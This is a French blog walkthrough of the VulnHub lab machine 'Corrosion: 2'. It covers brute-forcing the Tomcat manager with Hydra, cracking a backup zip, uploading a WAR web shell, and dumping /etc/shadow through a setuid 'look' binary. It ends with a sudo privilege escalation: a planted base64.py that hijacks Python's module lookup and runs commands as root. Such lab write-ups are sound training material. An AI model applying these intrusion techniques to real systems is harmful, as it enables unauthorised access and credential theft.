# Solution du CTF Corrosion #2 de VulnHub

Convertisseur de rouille
------------------------

[Corrosion: 2](https://www.vulnhub.com/entry/corrosion-2,745/) est le sobriquet de ce CTF téléchargeable sur VulnHub et créé par un certain *Proxy Programmer*.  

Comme le nom du CTF l'indique il y en a un autre avant mais il n'y a aucune obligation à les faire dans l'ordre :)  

```plain
Nmap scan report for 192.168.56.12
Host is up (0.00020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6a:d8:44:60:80:39:7e:f0:2d:08:2f:e5:83:63:f0:70 (RSA)
|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)
|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat 9.0.53
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.53
```

J'ai retourné le serveur Apache 2.4.41 en long en large et en travers histoire de trouver des fichiers/dossiers intéressant mais rien n'est venu !  

Ça fait mince pour commencer.  

Passons au serveur Tomcat. Une fois sur le site on suit le lien *manager* à l'adresse */manager/html* et sans surprise le serveur demande des identifiants.  

Peut être que l'Hydre de THC pourra nous sauver ? FuzzDB a la liste des users / passwords les plus courants pour du Tomcat.  

```plain
$ ./hydra -L /fuzzdb/wordlists-user-passwd/tomcat/tomcat_mgr_default_users.txt -P /fuzzdb/wordlists-user-passwd/tomcat/tomcat_mgr_default_pass.txt http-get://192.168.56.12:8080/manager/html
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-24 15:50:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:6/p:5), ~2 tries per task
[DATA] attacking http-get://192.168.56.12:8080/manager/html
1 of 1 target completed, 0 valid password found
```

*Rockyou* peut-être ? J'ai testé et abandonné au bout d'un moment.  

Tentons l'énumération web sur le Tomcat au cas où. C'est amusant d'utiliser un outil dont le nom est basé sur *Ferric Oxide* et écrit en *Rust* pour s'attaquer à un CTF nommé *Corrosion* :D  

Je tente d'énumérer les scripts JSP et archives WAR vu que l'on est sur du Tomcat ainsi que les fichiers textes au cas où.  

```plain
$ feroxbuster -u http://192.168.56.12:8080/ -w /fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -x jsp,txt,war -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.12:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ /fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [jsp, txt, war]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      198l      490w        0c http://192.168.56.12:8080/index.jsp
302        0l        0w        0c http://192.168.56.12:8080/docs
302        0l        0w        0c http://192.168.56.12:8080/manager
200      198l      490w        0c http://192.168.56.12:8080/
200        2l       29w      153c http://192.168.56.12:8080/readme.txt
302        0l        0w        0c http://192.168.56.12:8080/examples
200      174l      906w     6898c http://192.168.56.12:8080/RELEASE-NOTES.txt
302        0l        0w        0c http://192.168.56.12:8080/host-manager
```

Le fichier texte contient le message suivant :  

> Hey randy! It's your System Administrator.  
> 
> I left you a file on the server, I'm sure nobody will find it.  
> 
> Also remember to use that password I gave you.

Il est question de password donc le fichier doit être protégé par un mot de passe. Quels fichiers peuvent nécessiter un mot de passe ? La première idée qui me vient c'est ZIP mais ça pourrait aussi être 7z, RAR ou PDF...  

Une énumération sur la racine du Tomcat permet de retrouver un fichier *backup.zip* :  

```plain
unzip -l backup.zip 
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    13052  2021-09-06 21:09   catalina.policy
     1400  2021-09-06 21:09   context.xml
     7276  2021-09-06 21:09   catalina.properties
     1149  2021-09-06 21:09   jaspic-providers.xml
     2313  2021-09-06 21:09   jaspic-providers.xsd
     4144  2021-09-06 21:09   logging.properties
     7589  2021-09-06 21:09   server.xml
     2972  2021-09-17 06:07   tomcat-users.xml
     2558  2021-09-06 21:09   tomcat-users.xsd
   172359  2021-09-06 21:09   web.xml
---------                     -------
   214812                     10 files
```

Jerrymouse
----------

On passe l'archive à *zip2john* qui nous transforme cela en un beau hash de 3km puis à John the Ripper himself avec la wordlist *Rockyou* qui nous retrouve le mot de passe *@administrator\_hi5*.  

Le fichier *tomcat-users.xml* contient comme attendu les identifiants pour la zone *manager* :  

```html
<role rolename="manager-gui"/>
<user username="manager" password="melehifokivai" roles="manager-gui"/>

<role rolename="admin-gui"/>
<user username="admin" password="melehifokivai" roles="admin-gui, manager-gui"/>
```

Dès lors on peut uploader un shell au format WAR. Je n'avais pas envie de lancer un Kali + Metasploit juste pour ça, il existe différents outils plus basiques mentionnés sur [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#manual-method-web-shell).  

L'archiveur jar n'était pas présent sur ma machine mais j'ai trouvé un petit paquet *fastjar* pour ma distrib openSUSE (*zypper in fastjar*).  

```bash
$ mkdir webshell
$ cp index.jsp webshell
$ cd webshell
$ fastjar -cvf ../webshell.war *
```

Une fois le WAR uploadé j'obtiens mon shell à cette adresse : *http://192.168.56.12:8080/webshell/index.jsp?cmd=uname+-a*  

Let's take a look
-----------------

Un coup de [ReverseSSH](https://github.com/Fahrj/reverse-ssh) (mon nouveau meilleur ami) plus tard je fouille dans ce système qui a deux utilisateurs non privilégiés.  

```plain
randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
jaye:x:1002:1002::/home/jaye:/bin/sh
```

Je peux zieuter dans le dossier de *Randy* :  

```plain
drwxr-xr-x 2 randy randy 4096 Sep 16 17:23 Desktop
drwxr-xr-x 2 randy randy 4096 Sep 16 17:23 Documents
drwxr-xr-x 2 randy randy 4096 Sep 16 17:23 Downloads
drwxr-xr-x 2 randy randy 4096 Sep 16 17:23 Music
-rw-r--r-- 1 root  root   283 Sep 20 19:56 note.txt
drwxr-xr-x 2 randy randy 4096 Sep 16 17:23 Pictures
drwxr-xr-x 2 randy randy 4096 Sep 16 17:23 Public
-rwxr-xr-x 1 root  root   210 Sep 20 19:48 randombase64.py
drwxr-xr-x 2 randy randy 4096 Sep 16 17:23 Templates
-rw-rw-r-- 1 randy randy   33 Sep 17 02:09 user.txt
drwxr-xr-x 2 randy randy 4096 Sep 16 17:23 Videos
```

On trouve notre premier flag dans le fichier *user.txt* : *ca73a018ae6908a7d0ea5d1c269ba4b6*.  

*Randy* fait partie du groupe *sudo* ce qui est plutôt prometteur.  

Le script Python présent est le suivant :  

```python
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```

A ce stade, rien à un tirer. Le fichier *note.txt* contient le texte suivant :  

> Hey randy this is your system administrator, hope your having a great day! I just wanted to let you know  
> 
> that I changed your permissions for your home directory. You won't be able to remove or add files for now.  
> 
>   
> 
> I will change these permissions later on.  
> 
>   
> 
> See you next Monday randy!

Effectivement :  

```plain
tomcat@corrosion:/home/randy$ ls -ld .
dr-xr-xr-x 15 randy randy 4096 Sep 20 19:57 .
```

On n'est pas plus avancé ! On va faire un tour du côté de l'utilisateur *Jaye*.  

Il s'avère que ce dernier a le même mot de passe que pour Tomcat, on peut *su* ou se connecter via SSH.  

Cet utilisateur a un exécutable *setuid* dans son dossier *Files* :

```plain
---s--s--x  1 root root 14728 Sep 17 20:53 look
```

On ne dispose pas d'accès en lecture sur le fichier pour l'étudier dans les détails mais à l'exécution il sonne plus comme un binaire GNU classique :  

```plain
$ ./look
usage: look [-bdf] [-t char] string [file ...]
```

J'ai en effet retrouvé [une manpage correspondant à cette version](https://www.geeksforgeeks.org/look-command-in-linux-with-examples/) qui permet de comprendre les différentes options.  

Pour faire court cet utilitaire permet d'extraire d'un fichier texte toutes les lignes commençant par un pattern donné.  

```plain
$ ./look root /etc/shadow
root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
```

Et avec *randy* :  

```plain
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
```

J'ai écrit un script Python pour être en mesure de dumper la totalité d'un fichier grâce à ça. L'idée est de lancer *look* avec toutes les caractères imprimables :  

```python
import string
import subprocess
import sys

for c in string.printable:
    subprocess.call(["./look", c, sys.argv[1]])
```

On peut obtenir le flag final mais ça laisse un goût d'inachevé (rien de mieux qu'un shell) :  

```plain
$ python3 /tmp/test.py /root/root.txt
2fdbf8d4f894292361d6c72c8e833a4b
```

On voit que *randy* peut lancer son script Python en tant que *root* :  

```bash
$ python3 /tmp/test.py /etc/sudoers
root    ALL=(ALL:ALL) ALL
randy ALL=(root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
--- snip ---
```

Et pour la blague, en réalité mon script ne sert à rien car si on passe une chaîne vide à *look* il retourne la totalité du fichier :'D  

Pendant ce temps à Vera Cruz
----------------------------

L'utilisateur *randy* ne dispose pas de fichiers ou dossiers sur lesquels on peut écrire ni de process avec lesquels nous pourrions interagir... Il ne nous reste deux solutions :  

* bruteforce de son hash Unix
* utilisation d'un exploit sudo/kernel

La seconde option n'étant probablement pas celle attendue j'ai tenté de casser le hash sur ma machine puis l'ai finalement cassé avec [Penglab](https://github.com/mxrch/penglab).  

Il s'agit d'un notebook Python à faire exécuter sur l'environnement d'exécution *Colab* de Google.  

Après environ 45 minutes le hash est tombé (*07051986randy*) :  

![Corrosion 2 CTF cracking Randy hash using Google Colab](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/corrosion_2_colab_crack.png)

Note: si vous concevez un CTF n'utilisez JAMAIS un mot de passe aussi compliqué ou un algorithme de hashage aussi fort (pas de bcrypt ou de sha512 avec salt comme ici). Tout le monde n'a pas forcément votre carte graphique.  

De même en fonction de l'algorithme ça peut être très rapide à casser via GPU et très compliqué via CPU. Par exemple le minage de Bitcoin gagne à utiliser un GPU alors que l'algo de Monero est conçu pour n'apporter aucun gain via GPU.  

Renseignez vous sur le temps de brute-force d'un cryptosystème avant de le choisir.  

R290IHJvb3Qh
------------

Une fois notre shell pour *Randy* récupéré on peut changer les droits sur son dossier personnel (*chmod +w randy*).  

De là on ne peut pas modifier le script Python existant mais on peut exploiter la façon dont Python va chercher les modules sur le système en écrivant un fichier *base64.py* dans le même dossier que le script.  

J'aurais pu faire exécuter une simple commande j'ai j'ai choisi de hooker l'appel à *input()*, ça fait plus classe :)  

```python
import os
from sys import exit

def b64encode(b):
  return b

real_input = __builtins__["input"]

def input(s):
  cmd = real_input(s)
  os.system(cmd.strip())
  exit()

__builtins__["input"] = input
```

```plain
randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py
Enter your string: id
uid=0(root) gid=0(root) groups=0(root)
randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py
Enter your string: bash -p
root@corrosion:/home/randy# cd /root
root@corrosion:~# ls
root.txt  snap
root@corrosion:~# cat root.txt
2fdbf8d4f894292361d6c72c8e833a4b
```

That's all folks!  


*Published December 26 2021 at 11:33*